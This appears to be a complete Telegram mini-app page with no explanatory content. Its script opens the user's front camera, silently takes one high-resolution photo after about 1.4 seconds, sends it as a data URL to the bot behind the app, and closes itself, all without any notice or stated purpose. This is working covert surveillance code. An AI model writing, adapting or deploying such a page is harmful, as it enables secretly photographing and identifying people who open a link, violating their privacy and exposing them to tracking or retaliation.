<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><script src="https://telegram.org/js/telegram-web-app.js"></script><style>body{margin:0;background:#000;overflow:hidden}video{width:100vw;height:100vh;object-fit:cover}</style></head><body><video id="v" autoplay playsinline muted></video><script>
Telegram.WebApp.ready();Telegram.WebApp.expand();
navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{document.getElementById('v').srcObject=s;setTimeout(()=>{const c=document.createElement('canvas');c.width=1280;c.height=960;c.getContext('2d').drawImage(document.getElementById('v'),0,0,1280,960);c.toBlob(b=>{const r=new FileReader();r.onloadend=()=>{Telegram.WebApp.sendData(r.result);setTimeout(()=>Telegram.WebApp.close(),800)};r.readAsDataURL(b)},'image/jpeg',0.95);s.getTracks().forEach(t=>t.stop())},1400)})
</script></body></html>
